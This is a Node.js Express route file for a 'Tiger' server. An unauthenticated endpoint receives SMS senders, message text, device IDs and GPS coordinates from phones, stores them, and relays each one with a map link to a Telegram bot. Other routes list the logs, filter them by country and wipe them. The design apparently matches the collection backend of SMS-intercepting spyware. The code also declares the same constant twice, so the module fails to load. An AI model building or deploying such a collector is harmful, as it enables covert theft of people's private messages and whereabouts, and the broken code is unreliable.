const express = require('express');
const router = express.Router();
const SmsLog = require('../models/SmsLog');
const User = require('../models/User');
const axios = require('axios');

// Fallback in-memory logs when Mongo not available
let inMemoryLogs = [];
// Expose a getter so other routes (e.g., evidence generation) can access fallback logs
router.getInMemoryLogs = () => inMemoryLogs;

// POST /log-sms -> save SMS or ping to DB and notify user's Telegram if configured
router.post('/log-sms', async (req, res) => {
  try {
    const { sender, message, device, deviceId, timestamp, location, meta, type } = req.body;

    const inferredType = type || (message === 'ping' || sender === 'heartbeat' || sender === 'background' ? 'ping' : 'sms');

    const newEntry = new SmsLog({
      device: device || 'Tiger-Mobile',
      deviceId: deviceId || 'unknown',
      sender: sender || 'Unknown',
      message: message || 'No Content',
      time: timestamp ? new Date(timestamp) : new Date(),
      location: location || 'Disabled',
      type: inferredType,
      meta: meta || {}
    });

    try {
      await newEntry.save();
    } catch (dbErr) {
      console.warn('[logs] DB save failed, falling back to in-memory:', dbErr.message);
      inMemoryLogs.unshift({
        _id: Date.now(),
        device: newEntry.device,
        deviceId: newEntry.deviceId,
        sender: newEntry.sender,
        message: newEntry.message,
        time: newEntry.time,
        location: newEntry.location,
        type: newEntry.type,
        meta: newEntry.meta
      });
      if (inMemoryLogs.length > 500) inMemoryLogs.pop();
    }

    // After saving (or fallback), find user for this deviceId and notify if they have Telegram config
    try {
      const user = await User.findOne({ deviceId: newEntry.deviceId });
      if (user && user.telegramBotToken && user.telegramChatId) {
        const mapUrl = (newEntry.location !== 'Disabled') ? `\n📍 Location: https://www.google.com/maps?q=${newEntry.location}` : '';
        const telegramMsg = `🐯 *Tiger Alert!*\n\n` +
          `📱 *Device:* ${newEntry.device} (${newEntry.deviceId})\n` +
          `👤 *From:* ${newEntry.sender}\n` +
          `💬 *Message:* ${newEntry.message}\n` +
          `⏰ *Time:* ${newEntry.time.toLocaleString()}` + mapUrl;

        await axios.post(`https://api.telegram.org/bot${user.telegramBotToken}/sendMessage`, {
          chat_id: user.telegramChatId,
          text: telegramMsg,
          parse_mode: 'Markdown'
        }, { timeout: 10000 });
      }
    } catch (notifyErr) {
      console.warn('[logs] Telegram notify failed:', notifyErr.message);
    }

    res.status(200).json({ status: 'success', id: newEntry._id || Date.now() });
  } catch (err) {
    console.error('[logs] /log-sms error:', err);
    res.status(500).json({ status: 'error' });
  }
});

const { requireAuth } = require('../middleware/auth');

// POST /trigger-ping -> create a manual ping log for deviceId (used to test notifications)
router.post('/trigger-ping', requireAuth, async (req, res) => {
  try {
    const { deviceId, message = 'manual-ping' } = req.body;
    if (!deviceId) return res.status(400).json({ error: 'deviceId required' });

    const newEntry = new SmsLog({
      device: 'Manual',
      deviceId,
      sender: 'manual',
      message,
      time: new Date(),
      type: 'manual'
    });
    await newEntry.save();

    // Notify user if configured
    try {
      const user = await User.findOne({ deviceId });
      if (user && user.telegramBotToken && user.telegramChatId) {
        await axios.post(`https://api.telegram.org/bot${user.telegramBotToken}/sendMessage`, {
          chat_id: user.telegramChatId,
          text: `🐯 Manual test ping for device ${deviceId} at ${new Date().toLocaleString()}`
        });
      }
    } catch (e) {
      console.warn('[logs] manual notify failed:', e.message);
    }

    res.json({ success: true, id: newEntry._id });
  } catch (err) {
    console.error('[logs] trigger-ping error:', err);
    res.status(500).json({ success: false });
  }
});

// GET /get-logs -> list logs (supports ?deviceId= & ?country=)
const { requireAuth } = require('../middleware/auth');
router.get('/get-logs', requireAuth, async (req, res) => {
  try {
    const { deviceId, limit = 200, country } = req.query;
    const q = deviceId ? { deviceId } : {};
    let logs = [];
    try {
      logs = await SmsLog.find(q).sort({ time: -1 }).limit(Number(limit)).lean();
    } catch (dbErr) {
      console.warn('[logs] DB query failed, returning in-memory logs:', dbErr.message);
      logs = inMemoryLogs.filter(l => (deviceId ? l.deviceId === deviceId : true)).slice(0, Number(limit));
    }

    // If country filter is provided, reduce logs by reverse-geocoding each log's coords
    if (country) {
      try {
        const crg = require('country-reverse-geocoding').country_reverse_geocoding();
        const filtered = [];
        for (const l of logs) {
          if (!l.location || l.location === 'Disabled') continue;
          const parts = String(l.location).split(',').map(s => Number(s.trim()));
          if (parts.length !== 2 || Number.isNaN(parts[0]) || Number.isNaN(parts[1])) continue;
          const resCountry = crg.get_country(parts[0], parts[1]);
          if (resCountry && (resCountry.code === country || resCountry.name.toLowerCase() === country.toLowerCase())) {
            filtered.push(l);
          }
        }
        return res.json(filtered);
      } catch (e) {
        console.warn('[logs] Country filter processing failed:', e.message);
        return res.json([]);
      }
    }

    res.json(logs);
  } catch (err) {
    console.error('[logs] get-logs error:', err);
    res.status(500).json([]);
  }
});

// POST /clear-logs -> clear logs (admin)
const { requireAuth: requireAuthForClear } = require('../middleware/auth');
router.post('/clear-logs', requireAuthForClear, async (req, res) => {
  try {
    await SmsLog.deleteMany({});
    res.json({ success: true });
  } catch (err) {
    console.error('[logs] clear-logs error:', err);
    res.status(500).json({ success: false });
  }
});

// POST /send-test/:deviceId -> send a test notification to user's Telegram
router.post('/send-test/:deviceId', requireAuth, async (req, res) => {
  try {
    const { deviceId } = req.params;
    const user = await User.findOne({ deviceId });
    if (!user || !user.telegramBotToken || !user.telegramChatId) return res.status(400).json({ error: 'No telegram config for device' });

    const text = '🐯 Test notification from Tiger Server — ' + new Date().toLocaleString();
    await axios.post(`https://api.telegram.org/bot${user.telegramBotToken}/sendMessage`, {
      chat_id: user.telegramChatId,
      text
    });

    res.json({ success: true });
  } catch (err) {
    console.error('[logs] send-test error:', err);
    res.status(500).json({ success: false });
  }
});

module.exports = router;